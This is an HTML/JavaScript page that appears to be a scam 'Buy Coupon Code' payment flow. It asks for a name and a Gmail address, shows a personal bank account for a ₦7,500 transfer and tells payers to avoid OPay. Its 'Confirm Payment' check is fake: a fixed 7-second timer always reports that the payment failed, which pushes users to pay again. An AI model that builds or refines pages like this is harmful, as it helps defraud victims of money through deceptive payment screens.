<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy Coupon Code</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom font setup (Inter is assumed, setting a fallback) */
        :root {
            font-family: 'Inter', sans-serif;
        }
        /* Customizing Tailwind config on the fly for rounded corners and colors */
        .rounded-input {
            border-radius: 8px; /* Slightly more defined rounding than default Tailwind 'lg' */
        }

        /* --- Custom CSS for the Spinner Animation --- */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .spinner {
            border: 4px solid rgba(56, 193, 114, 0.2);
            border-top-color: #38C172;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
        }
        
        /* --- Custom Icons/Containers Styling --- */
        .icon-container {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 2rem;
        }
        .question-mark-container {
            /* For the Important Notice screen */
            background-color: #FEF7F7;
            border: 1px solid #FBE9E9;
        }
        .question-mark {
            font-size: 72px;
            color: #EF4444;
            line-height: 1;
        }

        /* --- STYLES FOR THE RED X ICON (Payment Failed) --- */
        .failure-icon-container {
            /* Solid red background for the circle */
            background-color: #EF4444; /* Tailwind red-600 */
            border: none;
        }
        .failure-icon {
            /* White color for the X icon itself */
            color: white; 
            /* Bigger size to fill the container more */
            width: 70px;
            height: 70px;
        }
        /* ------------------------------------------------ */

        /* Style for the small copy icon buttons */
        .copy-icon-btn {
            padding: 8px; /* Slightly more padding for touch target */
            border-radius: 8px; /* Rounded corners to match the card element */
            background-color: white; /* White background to match the screenshot */
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); /* Subtle shadow for 3D effect */
            color: #333;
        }

        /* Utility class to show the custom message box */
        .message-fade-in {
            animation: fadeIn 0.3s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'primary-green': '#38C172', /* Vibrant Green for buttons/accents */
                        'header-green': '#38C172',
                        'input-bg': '#F8F8F8', /* Very light gray for input background */
                        'label-text': '#333333',
                        'notice-red': '#DC2626',
                        'payment-purple': '#800080', /* Custom color for Transfer Details card */
                        'amount-green-bg': '#E6F4EA', /* Light green background for amount */
                        'warning-yellow-bg': '#FFFBEA', /* Light yellow background for warning text */
                        'warning-yellow-text': '#A16207',
                        'copy-blue': '#3B82F6', 
                        'copy-hover-bg': '#EFF6FF', 
                        'acct-bg': '#F9FAFB', 
                    },
                }
            }
        }
    </script>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col items-center">

    <!-- Header Section (Dynamically switches content/title) -->
    <header id="app-header" class="w-full bg-header-green shadow-md">
        <div class="p-4 flex items-center">
            <!-- Back Arrow -->
            <span id="back-arrow" class="text-white text-2xl cursor-pointer hidden mr-2" onclick="goBack()">&larr;</span>
            <!-- Header Title -->
            <h1 id="header-title" class="text-white text-xl font-semibold">Buy Coupon Code</h1>
        </div>
    </header>

    <!-- Main Content Area -->
    <main id="main-content" class="w-full max-w-sm p-6 flex-grow">
        <!-- Coupon Form Content (Visible by default) -->
        <form id="payment-form" class="space-y-6">
            <!-- Amount Display (Read-Only) -->
            <div>
                <label class="block text-base font-medium text-label-text mb-2">Amount</label>
                <div class="h-12 flex items-center px-4 bg-input-bg text-gray-800 rounded-input text-lg font-medium">
                    ₦7,500
                </div>
            </div>

            <!-- Full Name Input -->
            <div>
                <label for="full-name" class="block text-base font-medium text-label-text mb-2">Full Name</label>
                <input
                    type="text"
                    id="full-name"
                    placeholder="Your full name"
                    value=""
                    required
                    class="w-full h-12 px-4 bg-input-bg rounded-input border-none focus:ring-primary-green focus:ring-2 placeholder-gray-400 text-lg focus:outline-none"
                    aria-label="Your full name"
                >
            </div>

            <!-- Email Address Input -->
            <div>
                <label for="email" class="block text-base font-medium text-label-text mb-2">Your Email Address</label>
                <input
                    type="email"
                    id="email"
                    placeholder="email address"
                    value=""
                    required
                    pattern=".*@gmail\.com$"
                    class="w-full h-12 px-4 bg-input-bg rounded-input border-none focus:ring-primary-green focus:ring-2 placeholder-gray-400 text-lg focus:outline-none"
                    aria-label="Your email address"
                >
            </div>
            
            <!-- Error Message Box -->
            <div id="message-box" class="hidden p-3 bg-red-100 border border-red-400 text-red-700 rounded-lg text-sm transition-all duration-300" role="alert">
                <!-- Validation error message will be inserted here by JavaScript -->
            </div>
            <!-- Copy Success Message -->
            <div id="copy-success-message" class="hidden p-3 bg-primary-green text-white rounded-lg text-sm text-center message-fade-in fixed bottom-4 left-1/2 transform -translate-x-1/2 z-30 shadow-lg" role="status">
                Copied successfully!
            </div>

            <!-- Confirm Pay Button -->
            <button
                type="submit"
                id="confirm-button"
                class="w-full py-4 mt-8 bg-primary-green text-white font-bold text-lg rounded-lg hover:bg-green-700 transition duration-150 shadow-md shadow-green-300 active:scale-[0.99]"
            >
                Confirm Pay
            </button>
        </form>

        <!-- Payment Details Content (Hidden by default) -->
        <div id="payment-details-content" class="hidden space-y-4">
            <!-- Transfer Details Header Card -->
            <div class="bg-payment-purple p-6 rounded-xl shadow-lg flex flex-col items-center">
                <!-- Custom Inline SVG for Card/Calendar Icon (Exact Match) -->
                <svg class="w-10 h-10 text-white mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <rect x="3" y="7" width="18" height="13" rx="3" stroke-width="1.5"/>
                    <line x1="3" y1="10.5" x2="21" y2="10.5" stroke-width="1.5"/>
                    <circle cx="8" cy="8.75" r="1" stroke="none" fill="currentColor"/>
                    <circle cx="12" cy="8.75" r="1" stroke="none" fill="currentColor"/>
                    <circle cx="16" cy="8.75" r="1" stroke="none" fill="currentColor"/>
                </svg>
                <p class="text-white text-xl font-medium">Transfer Details</p>
            </div>

            <!-- Account Details Card (Restructured for Exact Match) -->
            <div class="bg-white rounded-xl shadow-lg border border-gray-100 p-6 space-y-4">
                
                <!-- Account Number Block (ACCT) -->
                <div class="flex justify-between items-start">
                    <div>
                        <p class="text-xs font-semibold uppercase text-gray-500 mb-1">ACCT</p>
                        <p id="acct-number" class="text-2xl font-bold text-gray-900 leading-none">0123796197</p>
                    </div>
                    <!-- Copy Button for Account Number - Small icon style -->
                    <button 
                        onclick="copyToClipboard('acct-number')" 
                        class="copy-icon-btn active:bg-gray-100 transition duration-100" 
                        aria-label="Copy Account Number"
                    >
                        <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5v2a2 2 0 002 2h7a2 2 0 002-2V5M16 17v2a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h2"/>
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10H5V8h10v2z"/>
                        </svg>
                    </button>
                </div>

                <!-- Name Block (NAME) -->
                <div>
                    <p class="text-xs font-semibold uppercase text-gray-500 mb-1">NAME</p>
                    <p class="text-lg font-bold text-gray-900">ONYEBUCHI MBAH</p>
                </div>

                <!-- Bank Block (BANK) -->
                <div>
                    <p class="text-xs font-semibold uppercase text-gray-500 mb-1">BANK</p>
                    <p class="text-lg font-bold text-gray-900">Sterling Bank</p>
                </div>
            </div>

            <!-- Amount to Transfer (Restructured for Exact Match) -->
            <div class="bg-amount-green-bg p-4 rounded-xl shadow-md flex justify-between items-start mt-6">
                <div>
                    <p class="text-xs font-semibold uppercase text-gray-700 mb-1">AMOUNT</p>
                    <p id="transfer-amount" class="text-2xl font-bold text-primary-green leading-none">₦7,500</p>
                </div>
                <!-- Copy Button for Amount - Small icon style -->
                <button 
                    onclick="copyToClipboard('transfer-amount', '₦')" 
                    class="copy-icon-btn active:bg-gray-100 transition duration-100" 
                    aria-label="Copy Transfer Amount"
                >
                    <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5v2a2 2 0 002 2h7a2 2 0 002-2V5M16 17v2a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h2"/>
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10H5V8h10v2z"/>
                    </svg>
                </button>
            </div>

            <!-- CONFIRM PAYMENT Button (Now has an ID and event listener) -->
            <button
                id="confirm-payment-button"
                class="w-full py-4 bg-primary-green text-white font-bold text-lg rounded-lg hover:bg-green-700 transition duration-150 shadow-md shadow-green-300 active:scale-[0.99] mt-8"
            >
                CONFIRM PAYMENT
            </button>

            <!-- Warning Text -->
            <div class="bg-warning-yellow-bg p-4 rounded-lg text-center text-sm font-medium mt-4">
                <p class="text-warning-yellow-text">
                    Transfer exactly ₦7,500.00 to the account above Your Coupon Code will be displayed on the app once your payment is confirmed.
                </p>
            </div>
        </div>
    </main>

    <!-- Footer Note -->
    <div id="main-footer" class="mt-auto pt-20 pb-10 text-center w-full max-w-md">
        <p class="text-sm text-gray-500 px-4">
            Your Coupon Code will be displayed on the app once your payment is confirmed.
        </p>
    </div>

    <!-- --- 1. Initial Loading Overlay (Processing) (Z-10) --- -->
    <div id="loading-overlay-1" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden z-10">
        <div class="spinner mb-6"></div>
        <p class="text-2xl font-semibold text-gray-700 mb-2">Processing...</p>
        <p class="text-primary-green text-base">Preparing payment account details</p>
    </div>
    
    <!-- --- 2. Important Notice Screen (Z-20) --- -->
    <div id="notice-screen" class="fixed inset-0 bg-white flex flex-col items-center justify-center p-6 text-center hidden z-20">
        <!-- Question Mark Icon -->
        <div class="icon-container question-mark-container">
            <span class="question-mark">?</span>
        </div>

        <h2 class="text-xl font-bold text-notice-red mb-4">Important Notice</h2>

        <!-- Notice Text -->
        <div class="text-gray-800 text-base leading-relaxed max-w-sm">
            <p class="mb-4">
                Do Not Use **OPay bank** made payment for your Coupon Code Use **Other bank** for fast **Verification**
            </p>
            <p class="mb-6">
                Use OPay your payment made not be confirm as All Use **Zenith, Palmpay, Access Bank, Moniepoint, Or Others Bank**
            </p>
        </div>

        <!-- Continue Button -->
        <button
            id="continue-button"
            class="w-full max-w-xs py-3 mt-4 bg-primary-green text-white font-bold text-lg rounded-lg hover:bg-green-700 transition duration-150 shadow-lg shadow-green-300 active:scale-[0.99]"
        >
            Continue
        </button>
    </div>

    <!-- --- 3. Confirmation Loading Overlay (Confirming your payment) (Z-30) --- -->
    <div id="loading-overlay-2" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden z-30">
        <div class="spinner mb-6"></div>
        <!-- Confirmed Payment Text: Dark color -->
        <p class="text-xl font-semibold text-gray-700 mb-2">Confirming your payment</p>
        <!-- Please Wait Text: Green color -->
        <p class="text-base text-primary-green">Please wait .......</p>
    </div>

    <!-- --- 4. Payment Failed Screen (Z-40) --- -->
    <div id="failed-screen" class="fixed inset-0 bg-white flex flex-col items-center p-6 text-center hidden z-40">
        <!-- Red X Icon (SVG cross inside solid red circle) -->
        <div class="icon-container failure-icon-container">
            <svg class="failure-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"/>
            </svg>
        </div>

        <h2 class="text-xl font-bold text-notice-red mb-4">Verification Payment filled</h2>
        
        <p class="text-gray-800 text-lg mb-4">
            We couldn't detect your payment at this time
        </p>
        <p class="text-gray-600 text-base mb-6">
            This could be due to:
        </p>
        
        <!-- Bulleted Reasons List (Styled as per screenshot) -->
        <ul class="list-disc list-inside text-left space-y-2 mb-10 text-gray-800 text-base max-w-xs">
            <li>Payment is still processing</li>
            <li>Incorrect amount transferred</li>
            <li>Payment made to wrong account</li>
            <li>Network delay in verification</li>
        </ul>

        <!-- Try Again Button -->
        <button
            id="try-again-button"
            class="w-full py-4 bg-primary-green text-white font-bold text-lg rounded-lg hover:bg-green-700 transition duration-150 shadow-md shadow-green-300 active:scale-[0.99] max-w-sm"
        >
            Try Again
        </button>

        <!-- Support Message -->
        <p class="text-sm text-gray-500 mt-6 max-w-sm">
            If you’ve made the payment and still see this message, please contact our support team with your transaction reference.
        </p>
    </div>


    <script>
        // The delay for the first loading screen (Processing...)
        const INITIAL_PAYMENT_DELAY_MS = 7000; 
        
        // ************************************************
        // UPDATED: The delay for the second loading screen (Confirming your payment...)
        const CONFIRMATION_DELAY_MS = 7000; 
        // ************************************************
        
        const form = document.getElementById('payment-form');
        const emailInput = document.getElementById('email');
        const messageBox = document.getElementById('message-box');
        const copySuccessMessage = document.getElementById('copy-success-message');
        
        const appHeader = document.getElementById('app-header');
        const headerTitle = document.getElementById('header-title');
        const backArrow = document.getElementById('back-arrow');
        
        const mainContent = document.getElementById('main-content');
        const mainFooter = document.getElementById('main-footer');
        const paymentFormContent = document.getElementById('payment-form');
        const paymentDetailsContent = document.getElementById('payment-details-content');
        
        const loadingOverlay1 = document.getElementById('loading-overlay-1'); 
        const loadingOverlay2 = document.getElementById('loading-overlay-2'); 
        const noticeScreen = document.getElementById('notice-screen');
        const failedScreen = document.getElementById('failed-screen'); 
        
        const continueButton = document.getElementById('continue-button');
        const confirmPaymentButton = document.getElementById('confirm-payment-button'); 
        const tryAgainButton = document.getElementById('try-again-button'); 
        
        // --- State Management and Navigation ---
        let currentScreen = 'form'; 

        /**
         * Sets the header state (title and back button).
         * @param {string} title - The new title for the header.
         * @param {boolean} showBack - Whether to show the back arrow.
         */
        function setHeader(title, showBack) {
            headerTitle.textContent = title;
            if (showBack) {
backArrow.classList.remove('hidden');
            } else {
           backArrow.classList.add('hidden');
            }
        }

        /**
         * Hides all screens and shows the desired screen by updating the UI elements.
         * @param {string} screenName - The name of the screen to show ('form', 'loading1', 'notice', 'details', 'loading2', 'failed').
         */
        function showScreen(screenName) {
            currentScreen = screenName;
            
            // Hide everything initially
            paymentFormContent.classList.add('hidden');
            paymentDetailsContent.classList.add('hidden');
            loadingOverlay1.classList.add('hidden');
            loadingOverlay2.classList.add('hidden');
            noticeScreen.classList.add('hidden');
            failedScreen.classList.add('hidden'); 
            mainContent.classList.add('hidden');
            mainFooter.classList.add('hidden');
            appHeader.classList.add('hidden');
            
            // Show the required elements based on the screen
            if (screenName === 'form') {
                setHeader('Buy Coupon Code', false);
                paymentFormContent.classList.remove('hidden');
                mainContent.classList.remove('hidden');
                mainFooter.classList.remove('hidden');
                appHeader.classList.remove('hidden');
            } else if (screenName === 'loading1') {
                loadingOverlay1.classList.remove('hidden');
            } else if (screenName === 'notice') {
                noticeScreen.classList.remove('hidden');
            } else if (screenName === 'details') {
                setHeader('Payment Details', true);
                paymentDetailsContent.classList.remove('hidden');
                mainContent.classList.remove('hidden');
                appHeader.classList.remove('hidden');
            } else if (screenName === 'loading2') {
                loadingOverlay2.classList.remove('hidden');
            } else if (screenName === 'failed') {
                failedScreen.classList.remove('hidden');
            }
        }

        // --- Event Handlers ---

        form.addEventListener('submit', function(event) {
            event.preventDefault();

            // 1. Reset message box visibility
            messageBox.classList.add('hidden');
            copySuccessMessage.classList.add('hidden');

            // 2. Form Validation Check
            if (!form.checkValidity()) {
                if (emailInput.validity.patternMismatch) {
                    messageBox.textContent = "Error: The email address must end with @gmail.com.";
                } else if (emailInput.validity.valueMissing || document.getElementById('full-name').validity.valueMissing) {
                    messageBox.textContent = "Error: Please complete all required fields (Name and Email).";
                }
                
                messageBox.classList.remove('hidden');
                return;
            }

            // 3. Validation passed: Show Loading Screen 1
            showScreen('loading1');
            console.log("Validation successful. Starting initial payment simulation.");

            // 4. Wait for INITIAL_PAYMENT_DELAY_MS, then transition to the Notice Screen
            setTimeout(() => {
                showScreen('notice');
                console.log("Initial load completed. Displaying Important Notice.");
            }, INITIAL_PAYMENT_DELAY_MS);
        });

        // 5. Handle the Continue button click on the Notice Screen
        continueButton.addEventListener('click', () => {
            showScreen('details');
            console.log("User clicked 'Continue'. Displaying Payment Details.");
        });

        // 6. Handle the Confirm Payment button click on the Details Screen
        confirmPaymentButton.addEventListener('click', () => {
            // Show Loading Screen 2 (Confirming your payment)
            showScreen('loading2');
            console.log("User clicked 'Confirm Payment'. Starting confirmation loading for 7 seconds.");

            // Simulation: Fail the payment after the set confirmation delay (7 seconds)
            setTimeout(() => {
                showScreen('failed'); 
                console.log("Confirmation failed after 7 seconds. Displaying error screen.");
            }, CONFIRMATION_DELAY_MS); 
        });

        // 7. Handle the Try Again button click on the Failed Screen
        tryAgainButton.addEventListener('click', () => {
            // Reset to the initial form
            showScreen('form');
            console.log("User clicked 'Try Again'. Resetting to initial form.");
        });

        // 8. Handle Back Arrow (only relevant for the Payment Details screen)
        function goBack() {
            if (currentScreen === 'details') {
                showScreen('notice'); 
            }
        }
        window.goBack = goBack; 

        // --- Utility for Copy to Clipboard ---
        function copyToClipboard(elementId, prefix = '') {
            const element = document.getElementById(elementId);
            if (!element) return;

            // Extract text, cleaning up any currency prefix
            let textToCopy = element.textContent.trim();
            if (prefix && textToCopy.startsWith(prefix)) {
                textToCopy = textToCopy.substring(prefix.length).trim();
            }

            // Standard clipboard copy method
            const tempInput = document.createElement('textarea');
            // Remove comma from amount for clean copying (e.g., 6,100.00 -> 6100.00)
            tempInput.value = textToCopy.replace(/,/g, ''); 
            document.body.appendChild(tempInput);
            
            tempInput.select();
            tempInput.setSelectionRange(0, 99999); 

            try {
                const successful = document.execCommand('copy');
                if (successful) {
                    copySuccessMessage.textContent = `${textToCopy} copied successfully!`;
                    copySuccessMessage.classList.remove('hidden');
                    setTimeout(() => {
                        copySuccessMessage.classList.add('hidden');
                    }, 2000);
                } else {
                    console.error('Copy command failed.');
                }
            } catch (err) {
                console.error('Unable to copy text: ', err);
            }

            document.body.removeChild(tempInput);
        }
        window.copyToClipboard = copyToClipboard; 

        // Initialize to the main form screen on load
        showScreen('form');
    </script>
</body>
</html>
